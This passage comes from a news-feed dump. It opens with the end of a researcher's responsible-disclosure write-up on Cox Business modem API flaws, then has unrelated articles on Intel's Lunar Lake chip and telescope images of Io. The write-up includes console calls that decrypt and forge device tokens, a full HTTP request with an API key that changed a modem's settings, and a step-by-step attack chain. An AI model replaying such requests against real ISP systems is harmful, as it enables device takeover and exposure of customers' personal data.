    <span>const</span> k = n.<span>AES</span>.<span>encrypt</span>(D, <span>this</span>.<span>getKey</span>(), {
        <span>iv</span>: n.<span>enc</span>.<span>Hex</span>.<span>parse</span>(s.<span>IV</span>)
    }).<span>ciphertext</span>.<span>toString</span>(n.<span>enc</span>.<span>Base64</span>);
    <span>return</span> <span>btoa</span>(s.<span>IV</span> + <span>"::"</span> + s.<span>qs</span> + <span>"::"</span> + k)
}
</code></pre>
<pre><code><span>decryptWithSaltandPadding</span>(<span>D</span>) {
    <span>const</span> W = <span>atob</span>(D),
        k = <span>this</span>.<span>sanitize</span>(W.<span>split</span>(<span>"::"</span>)[<span>2</span>]),
        M = n.<span>lib</span>.<span>CipherParams</span>.<span>create</span>({
            <span>ciphertext</span>: n.<span>enc</span>.<span>Base64</span>.<span>parse</span>(k)
        });
    <span>return</span> n.<span>AES</span>.<span>decrypt</span>(M, <span>this</span>.<span>getKey</span>(), {
        <span>iv</span>: n.<span>enc</span>.<span>Hex</span>.<span>parse</span>(s.<span>IV</span>)
    }).<span>toString</span>(n.<span>enc</span>.<span>Utf8</span>)
}
</code></pre>
<p>Both of these functions took in variables which only existed at runtime, so the easiest way to actually call these functions would be to find somewhere it was called within the actual UI. After searching for a little while, I’d realized that the 4-digit PIN that I set when registering my account was encrypted using the same function!</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>I set a breakpoint at exactly where the <code>encryptWithSaltAndPadding</code> function was called, then hit enter.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Now that I had a breakpoint set and I was in the correct context for the function I could simply paste the function into my console and run whatever I wanted. To validate that it worked, I copied the encrypted value of the PIN code that was sent in the POST request and passed it to the decrypt function.</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjova3paY1orSjRGR0YwWGFvRkhwWHZRPT0="</span>)
<span>"8042"</span>
</code></pre>
<p>Perfect! It worked as expected. The only issue now was getting the encrypted value of a device. I asked around for a while until I found a friend who owned a MSP a few states away who used Cox Business. They gave me a login to their account and I saw what appeared to be an <code>encryptedValue</code> parameter in one of the HTTP responses after authenticating into their account. I copied this value and passed it to the decrypt function once again:</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpiYk1SNGQybzFLZHhRQ1VQNnF2TWl1QlZ0NEp6WVUyckJGMXF5T0dYTVlaNWdjZkhISTZnUFppdjM3dmtRSUcxclNkMC9WNmV2WFE1eko0VnFZUnFodz09"</span>)
<span>541051614702</span>;<span>DTC4131</span>;<span>333415591</span>;<span>1</span>;<span>f4</span>:<span>c1</span>:<span>14</span>:<span>70</span>:4<span>d</span>:ac;<span>Internet</span>
</code></pre>
<p>Well, that’s annoying. It looked like the encrypted parameter had the MAC address, but also an account ID and a few extra parameters.</p>
<pre><code><span>541051614702</span> <span>=</span> <span>Cox</span> <span>Account</span> <span>Number</span>
<span>DTC4131</span> <span>=</span> <span>Device</span> <span>Name</span>
<span>333415592</span> <span>=</span> <span>Device</span> <span>ID</span>
<span>1</span> <span>=</span> <span>Unknown</span>
<span>f4:c1:14:70:4d:ac</span> <span>=</span> <span>MAC</span> <span>address</span>
<span>Internet</span> <span>=</span> <span>Label</span>
</code></pre>
<p>If there was some validation which checked that the MAC address matched the account ID it would make exploiting this somewhat complicated. I investigated further.</p>
<h2 id="executing-commands-on-any-modem">Executing Commands on Any Modem</h2>
<p>On a leap of faith, I tried signing an “encryptedValue” string with junk data for everything except the MAC address (e.g. <code>123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING</code>) to see if it actually validated that the account ID matched the MAC address:</p>
<pre><code>t.<span>cbHelper</span>.<span>encryptWithSaltandPadding</span>(<span>"123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING"</span>)
<span>OGEzMjNmNjFhOTk</span>2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpLUlArd3Jqek5Ra3VlZUVReXVUWEZHbE91NWVQRzk0WEo1Zi9wSDdVZWxHVkFXYmtWd2Z2YmNHU1FWOVRFT2prZm5tNFhWZlQwNkQ3V2tDU1FqbHpIUT09
</code></pre>
<p>The only thing in the above parameter that was valid was the device serial number. If this request worked, it meant that I could use an “encryptedValue” parameter in the API that didn’t have to have a matching account ID.</p>
<p>I sent the request and saw the exact same HTTP response as above! This confirmed that we didn’t need any extra parameters, we could just query any hardware device arbitrarily by just knowing the MAC address (something that we could retrieve by querying a customer by name, fetching their account UUID, then fetching all of their connected devices via their UUID). We now had essentially a full kill chain.</p>
<p>I formed the following HTTP request to update my own device MAC addresses SSID as a proof of concept to update my own hardware:</p>
<pre><code><span>POST</span> <span>/api/cbma/accountequipment/services/accountequipment/gatewaydevice/wifisettings</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>User-Agent:</span> <span>Mozilla/5.0</span> <span>(Windows</span> <span>NT</span> <span>10.0</span><span>;</span> <span>Win64;</span> <span>x64;</span> <span>rv:123.0)</span> <span>Gecko/20100101</span> <span>Firefox/123.0</span>
<span>Accept:</span> <span>application/json,</span> <span>text/plain,</span> <span>*/*</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
<span>Ma_transaction_id:</span> <span>56583255</span><span>-1cf3-41aa-9600-3d5585152e87</span>
<span>Connection:</span> <span>close</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Content-Length:</span> <span>431</span>

{
  <span>"wifiSettings":</span> {
    <span>"customerWifiSsid24":</span> <span>"Curry"</span>
  },
  <span>"additionalProperties":</span> {
    <span>"customerWifiSsid24":</span> [
      <span>"Curry"</span>
    ]
  },
  <span>"encryptedValue":</span> <span>"T0dFek1qTm1OakZoT1RrMk1HSTJPVE0wTnpBek5Ua3pPRFprT0dZeE9ESTZPamhoTnpVMU5UTmxNREF6T1RsaE5XUTVaams1WlRZek16TTNNMlJpWVdVek9qcENVMlp1TjJ0blVsTkNlR1ZhZDJsd05qZGhjWFo0TTJsaVJHSkhlU3N2TUhWVWFYZzJWVTByYzNsT2RYWklMek16VjJ4VldFYzJTMWx5VEVNMVRuSkxOVVF3VFhFek9UVmlUR2RGVFd4RUt6aGFUMnhoZHowOQ=="</span>
}
</code></pre>
<pre><code>HTTP/<span>1.1</span> <span>200</span> OK
Server<span>:</span> nginx

<span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span>
<span>}</span>
</code></pre>
<p>Did it work? It had only given me a blank 200 OK response. I tried re-sending the HTTP request, but the request timed out. My network was offline. The update request must've reset my device.</p>
<p>About 5 minutes later, my network rebooted. The SSID name had been updated to “Curry”. I could write and read from anyone's device using this exploit.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>This demonstrated that the API calls to update the device configuration worked. This meant that an attacker could've accessed this API to overwrite configuration settings, access the router, and execute commands on the device. At this point, we had a similar set of permissions as the ISP tech support and could've used this access to exploit any of the millions of Cox devices that were accessible through these APIs.</p>
<p>I reached out to Cox via their responsible disclosure page and shared details of the vulnerability. They took down the exposed API calls within six hours then began working on the authorization vulnerabilities. I was no longer able to reproduce any of the vulnerabilities the next day.</p>
<h2 id="impact">Impact</h2>
<p>This series of vulnerabilities demonstrated a way in which a fully external attacker with no prerequisites could've executed commands and modified the settings of millions of modems, accessed any business customer's PII, and gained essentially the same permissions of an ISP support team.</p>
<p>Cox is the largest private broadband provider in the United States, the third-largest cable television provider, and the seventh largest telephone carrier in the country. They have millions of customers and are the most popular ISP in 10 states.</p>
<p>An example attack scenario would've looked like the following:</p>
<ol>
<li>Search for a Cox business target through the exposed APIs using their name, phone number, email address, or account number</li>
<li>Retrieve their full account PII via querying the returned UUID from step one including device MAC addresses, email, phone number, and address</li>
<li>Query their hardware MAC address to retrieve Wifi password and connected devices</li>
<li>Execute arbitrary commands, update any device property, and takeover victim accounts</li>
</ol>
<p>There were over 700 exposed APIs with many giving administrative functionality (e.g. querying the connected devices of a modem). Each API suffered from the same permission issues where replaying HTTP requests repeatedly would allow an attacker to run unauthorized commands.</p>
<h2 id="addendum">Addendum</h2>
<p>After reporting the vulnerability to Cox, they investigated if the specific vector had ever been maliciously exploited in the past and found no history of abuse (the service I found the vulnerabilities in had gone live in 2023, while my device had been compromised in 2021). They had also informed me that they had no affiliation with the DigitalOcean IP address, meaning that the device had definitely been hacked, just not using the method disclosed in this blog post.</p>
<p>I'm still super curious on the exact way in which my device was compromised as I had never made my modem externally accessible nor even logged into the device from my home network. This blog post really aims to highlight vulnerabilities in the layer of trust between the ISP and customer devices, but the modem could've been compromised by some other much more boring method (e.g. local CSRF to RCE 0day which I triggered locally within my home network).</p>
<p>One of the things I'll never understand was why the attacker was replaying my traffic? They were clearly in my network and could access everything without being detected, why replay all the HTTP requests? So odd.</p>
<p>Anyway, thanks for reading! More than happy to listen to any theories, comments, or whatever about what happened here. Feel free to reach out at samwcurry (symbol goes here) gmail (dot goes here) com.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>03/04/2024 - Vulnerability reported to Cox via their <a href="https://www.cox.com/aboutus/policies/cox-security-responsible-disclosure-policy.html">responsible disclosure program</a></li>
<li>03/05/2024 - Vulnerability is hot-patched, all non-essential business endpoints return 403 and no longer function</li>
<li>03/06/2024 - Email Cox that I can no longer reproduce the vulnerability</li>
<li>03/07/2024 - Cox writes that they are beginning a comprehensive security review</li>
<li>04/10/2024 - Informed Cox of intent to disclose 90 days from disclosure</li>
<li>04/29/2024 - Shared link to blog post draft with Cox</li>
</ul>
<h2 id="thanks">Thanks</h2>
<ul>
<li>Thanks to <a href="https://twitter.com/blastbots">@blastbots</a> for the full redesign of the blog, I can now write posts in markdown and have an RSS feed!</li>
<li>Thanks to <a href="https://twitter.com/sshell_">Justin Rhinehart</a> and <a href="https://twitter.com/birchb0y">Alden</a> for working closely with me for the investigation process, providing tons of help doing OSINT stuff.</li>
<li>Thanks to <a href="https://twitter.com/galnagli">Gal Nagli</a>, <a href="https://twitter.com/bbuerhaus">Brett Buerhaus</a>, <a href="https://twitter.com/avlidienbrunn">Mathias Karlsson</a>, <a href="https://twitter.com/d0nutptr">Nathanial Lattimer</a>, <a href="https://twitter.com/xEHLE_">Maik Robert</a>, <a href="https://twitter.com/infosec_au">Shubham Shah</a>, <a href="https://twitter.com/0xteknogeek">Joel Margolis</a>, <a href="https://twitter.com/Rhynorater">Justin Gardner</a>, Daley Borda, <a href="https://twitter.com/umasiii">William Tom</a>, and Ebrietas for reviewing the draft version of this blog post.</li>
<li>Thanks to the Cox Communications security team for quickly fixing the issue and staying in touch throughout the process.</li>
</ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intel Unveils Lunar Lake Architecture (136 pts)]]></title>
            <link>https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4</link>
            <guid>40570356</guid>
            <pubDate>Tue, 04 Jun 2024 03:17:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4">https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4</a>, See on <a href="https://news.ycombinator.com/item?id=40570356">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>

                

<div>
    <nav>
        <ul>
            <li><a href="https://www.anandtech.com/">Home</a><span>&gt;</span></li>
                <li><a href="https://www.anandtech.com/tag/socs">SoCs</a></li>
        </ul>
        
    </nav>

    
    
</div>





    
    

<div>

                <p><img src="https://images.anandtech.com/doci/21425/LL_Car3_678x452.jpg" alt="">
                </p>

            


        <div>
            <p>Intel this morning is lifting the lid on&nbsp;some of the finer architectural and technical details about its upcoming Lunar Lake SoC – the chip that will be the next generation of Core Ultra mobile processors. Once again holding one of their increasingly regular Tech Tour events for media and analysts, Intel this time set up shop in Taipei just before the beginning of Computex 2024. During the Tech Tour, Intel disclosed numerous facets of Lunar Lake, including their new P-Core design codenamed <em>Lion Cove</em> and a new wave of E-cores that are a bit more like Meteor Lake's pioneering Low Power Island E-Cores. Also disclosed was the Intel NPU 4, which Intel claims delivers up to 48 TOPS, surpassing&nbsp;Microsoft's Copilot+ requirements for the new age of AI PCs.</p>

<p>Intel's Lunar Lake represents a strategic evolution in their mobile SoC lineup, building on their Meteor Lake launch last year, focusing&nbsp;on&nbsp;enhancing power efficiency and optimizing performance across the board. Lunar Lake dynamically allocates tasks to efficient cores (E-cores) or performance cores (P-cores) based on workload demands by leveraging advanced scheduling mechanisms, which are assigned to ensure optimal power usage and performance. Still, once again, Intel Thread Director, along with Windows 11, plays a pivotal role in this process, guiding the OS scheduler to make real-time adjustments that balance efficiency with computational power depending on the intensity of the workload.</p>

<table>
	<tbody>
		<tr>
			<td colspan="6">Intel CPU Architecture Generations</td>
		</tr>
		<tr>
			<td>&nbsp;</td>
			<td>Alder/Raptor Lake</td>
			<td>Meteor<br>
			Lake</td>
			<td><b>Lunar<br>
			Lake</b></td>
			<td>Arrow<br>
			Lake</td>
			<td>Panther<br>
			Lake</td>
		</tr>
		<tr>
			<td>P-Core Architecture</td>
			<td>Golden Cove/<br>
			Raptor Cove</td>
			<td>Redwood Cove</td>
			<td><strong>Lion Cove</strong></td>
			<td>Lion Cove</td>
			<td>Cougar Cove?</td>
		</tr>
		<tr>
			<td>E-Core Architecture</td>
			<td>Gracemont</td>
			<td>Crestmont</td>
			<td><strong>Skymont</strong></td>
			<td>Crestmont?</td>
			<td>Darkmont?</td>
		</tr>
		<tr>
			<td>GPU Architecture</td>
			<td>Xe-LP</td>
			<td>Xe-LPG</td>
			<td><strong>Xe2</strong></td>
			<td>Xe2?</td>
			<td>?</td>
		</tr>
		<tr>
			<td>NPU Architecture</td>
			<td>N/A</td>
			<td>NPU 3720</td>
			<td><strong>NPU 4</strong></td>
			<td>?</td>
			<td>?</td>
		</tr>
		<tr>
			<td>Active Tiles</td>
			<td>1 (Monolithic)</td>
			<td>4</td>
			<td><strong>2</strong></td>
			<td>4?</td>
			<td>?</td>
		</tr>
		<tr>
			<td>Manufacturing Processes</td>
			<td>Intel 7</td>
			<td>Intel 4 + TSMC N6 + TSMC N5</td>
			<td><strong>TSMC N3B + TSMC N6</strong></td>
			<td>Intel 20A + More</td>
			<td>Intel 18A</td>
		</tr>
		<tr>
			<td>Segment</td>
			<td>Mobile + Desktop</td>
			<td>Mobile</td>
			<td><strong>LP Mobile</strong></td>
			<td>HP Mobile + Desktop</td>
			<td>Mobile?</td>
		</tr>
		<tr>
			<td>Release Date (OEM)</td>
			<td>Q4'2021</td>
			<td>Q4'2023</td>
			<td><strong>Q3'2024</strong></td>
			<td>Q4'2024</td>
			<td>2025</td>
		</tr>
	</tbody>
</table>

<h3>Lunar Lake: Designed By Intel, Built By TSMC (&amp; Assembled By Intel)</h3>

<p>While there are many aspects of Lunar Lake to dive into, perhaps it's best we start with what's sure to be the most eye-catching: who's building it.</p>

<p>Intel's Lunar Lake tiles are not being fabbed using any of their own foundry facilities – a sharp departure from historical precedence, and even the recent Meteor Lake, where the compute tile was made using the Intel 4 process. Instead, both tiles of the disaggregated Lunar Lake are being fabbed over at TSMC, using a mix of TSMC's N3B and N6 processes. In 2021 Intel set about freeing their chip design groups to use the best foundry they could – be it internal or external – and there's no place that's more apparent than here.</p>

<p>Overall, Lunar Lake represents their second generation of disaggregated SoC architecture for the mobile market, replacing the Meteor Lake architecture in the lower-end space.&nbsp;At this time, Intel has disclosed that it uses a 4P+4E (8 core) design, with hyper-threading/SMT disabled, so the total thread count supported by the processor is simply the number of CPU cores, e.g., 4P+4E/8T.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-49.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-49.png"></a></p>

<p>The build-up of Lunar Lake combines a synergetic collaboration between Intel’s architectural design team and TSMC's manufacturing process nodes to bring the latest Lion Cove P-cores to Lunar Lake, which boosts Intel's architectural IPC as you would expect from a new generation. At the same time, Intel also&nbsp;introduces the Skymont E-cores, which replace the Low Power Island Cresmont E-cores of Meteor Lake. Notably, however, these E-cores don't connect to the ring bus like the P-cores, which makes them a sort of hybrid LP E-core, combining the efficiency gains of the more advanced TSMC N3B node with the double-digit gains in IPC over the previous Crestmont cores.</p>

<p>The entire compute tile, including the P and E-cores, is built on TSMC's N3B node, while the SoC tile is made using the TSMC N6 node.</p>

<p>At a higher level, Intel is once again using their Foveros packaging technology here. Both the compute and SoC (now the "Platform Controller") tiles sit on top of a base tile, which provides high-speed/low-power routing between the tiles, and further connectivity to the rest of the chip and beyond.</p>

<p>In another first for a mainstream Intel Core product, the Lunar Lake SoC platform also&nbsp;includes up to 32 GB of LPDDR5X memory on the chip package itself. This is arranged as a pair of 64-bit memory chips, offering a total 128-bit memory interface. As with other vendors using on-package memory, this change means that users can't just upgrade DRAM at-will, and the memory configurations for Lunar Lake will ultimately be determined by what SKUs Intel opts to ship.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-51.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-51.png"></a></p>

<p>With Lunar Lake, Intel is also strongly focusing on AI, as the architecture integrates a new NPU called NPU 4. This NPU is rated for up to 48 TOPS of INT8 performance, thus making it Microsoft Copilot+ AI PC ready. This is the bar all of the PC SoC vendors are aiming for, including AMD and Qualcomm too.</p>

<p>Intel's integrated GPU will also be a contributing player here. While not the highly efficient machine that the dedicated NPU is, the Arc Xe2-LPG brings dozens of additional T(FL)OPS of performance with it, and some additional flexibility an NPU doesn't come with. Which is why you'll also see Intel rating the performance of these chips in terms of total platform TOPS – in this case, 120 TOPS.</p>

<p>Intel's collaboration with Microsoft further enhances workload management through the fabled Intel Thread Director, optimized for applications such as the Copilot assistant. Given the time of the introduction of Lunar Lake, it somewhat sets the stage for a Q3 2024 launch, which coincides with the&nbsp;holiday 2024 market.</p>

<h3>Intel Lunar Lake: Updating Intel Thread Director &amp; Power Management Improvements</h3>

<p>To say that energy efficiency is a key goal for Lunar Lake would be an understatement. For as much as Intel is riding high in the mobile PC CPU market (AMD's share there is still but a fraction), the company has been feeling the pressure over the last few years from customer-turned-rival Apple, whose M-series Apple Silicon has been setting the bar for power efficiency over the last few years. And now with Qualcomm attempting to do the same things for the Windows ecosystem with their forthcoming Snapdragon X chips, Intel is preparing to make their own power play.</p>

<p>Intel's Thread Director and power management updates for Lunar Lake show various and significant improvements compared to Meteor Lake. The Thread Director uses a heterogeneous scheduling policy, initially assigning tasks to a single E-core and expanding to other E-cores or P-cores as and when needed. OS containment zones are designed to limit tasks to specific cores, which directly improves power efficiency and delivers the performance needed by the right core for the workload at hand.&nbsp;Integration with power management systems and a quad array of Power Management Controllers (PMC) further allows the chip, in concert with Windows 11, to make context-aware adjustments, ensuring optimal performance with minimal power usage and wastage.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-04.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-04.png"></a></p>

<p>Lunar Lake's scheduling strategy effectively handles power-sensitive applications. One example Intel gave is that&nbsp;video conferencing tasks are kept within the efficiency core cluster, utilizing the E-cores to maintain performance while reducing power consumption by up to 35%, as shown by Intel's provided data. These improvements are achieved through collaboration with OS developers such as Microsoft for seamless integration for optimizing for the best balance between power consumption and performance.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-19.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-19.png"></a></p>

<p>Focusing on the power management system for Lunar Lake, Intel uses its SoC power management, operating in efficiency, balance, and performance modes tailored and designed to adapt to whatever the demands of the workload at the time of operation. This multi-layered approach allows the Lunar Lake SoC to operate efficiently. Again,&nbsp;much like the Intel&nbsp;Thread Director, the PMCs can&nbsp;balance power usage with performance needs.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-17.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-17.png"></a></p>

<p>Intel further plans to enhance the Thread Director by increasing scenario granularity, implementing AI-based scheduling hints, and enabling cross-IP scheduling within Windows 11. These enhancements essentially equate to workload management designed to boost overall power efficiency and deliver performance across various applications when needed without wasting power budget by allocating lighter tasks to the higher power P-cores.</p>

<p>Over the next few pages, we'll explore the new P and E cores and Intel's update to ther integrated Arc Xe (Xe2-LPG) graphics.</p>

        </div>
        <p><a href="https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4/2">Intel Lunar Lake: New P-Core, Enter Lion Cove</a>

                
        </p>
            
            
            
            
            


</div>

    



            </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intel's Lion Cove Architecture Preview (153 pts)]]></title>
            <link>https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/</link>
            <guid>40570326</guid>
            <pubDate>Tue, 04 Jun 2024 03:11:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/">https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/</a>, See on <a href="https://news.ycombinator.com/item?id=40570326">Hacker News</a></p>
Couldn't get https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[New telescope images of Jupiter's moon Io rival those from spacecraft (168 pts)]]></title>
            <link>https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html</link>
            <guid>40569949</guid>
            <pubDate>Tue, 04 Jun 2024 01:57:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html">https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html</a>, See on <a href="https://news.ycombinator.com/item?id=40569949">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
										
<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/glimpses-of-a-volcanic.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2024/glimpses-of-a-volcanic.jpg" data-sub-html="The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/glimpses-of-a-volcanic.jpg" alt="Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft" title="The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA" width="800" height="530">
             <figcaption>
                The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA
            </figcaption>        </figure>
    </div><p>New images of Jupiter's volcano-studded moon Io, taken by the Large Binocular Telescope on Mount Graham in Arizona, offer the highest resolution of Io ever achieved with an Earth-based instrument. The observations were made possible by a new high-contrast optical imaging instrument, dubbed SHARK-VIS, and the telescope's adaptive optics system, which compensates for the blurring induced by atmospheric turbulence.</p>


										      
																																	<p>The images, to be published in the journal <i>Geophysical Research Letters</i>, reveal surface features as small as 50 miles across, a spatial resolution that until now had been achievable only with spacecraft sent to Jupiter. This is equivalent to taking a picture of a dime-sized object from 100 miles away, according to the research team.</p>
<p>SHARK-VIS allowed the researchers to identify a major resurfacing event around Pele, one of Io's most prominent volcanoes. According to the paper's first author, Al Conrad, the eruptions on Io, the most volcanically active body in the solar system, dwarf their contemporaries on Earth.</p>
<p>"Io, therefore, presents a unique opportunity to learn about the mighty eruptions that helped shape the surfaces of the Earth and the moon in their distant pasts," said Conrad, associate staff scientist at the Large Binocular Telescope Observatory. The Large Binocular Telescope, or LBT, is part of Mount Graham International Observatory, a division of the University of Arizona Steward Observatory.</p>
<p>Conrad added that studies like this one will help researchers understand why some worlds in the solar system are volcanic but not others. They also may someday shed light on volcanic worlds in exoplanet systems around nearby stars.</p>
<p>Slightly larger than Earth's moon, Io is the innermost of Jupiter's Galilean moons, which in addition to Io, include Europa, Ganymede and Callisto. Locked in a gravitational "tug of war" among Jupiter, Europa and Ganymede, Io is constantly being squeezed, leading to frictional heat buildup in its interior—believed to be the cause for its sustained and widespread volcanic activity.</p>

																																						
																																			<p>By monitoring the eruptions on Io's surface, scientists hope to gain insights into the heat-driven movement of material underneath the moon's surface, its internal structure and ultimately, on the tidal heating mechanism responsible for Io's intense volcanism.</p>
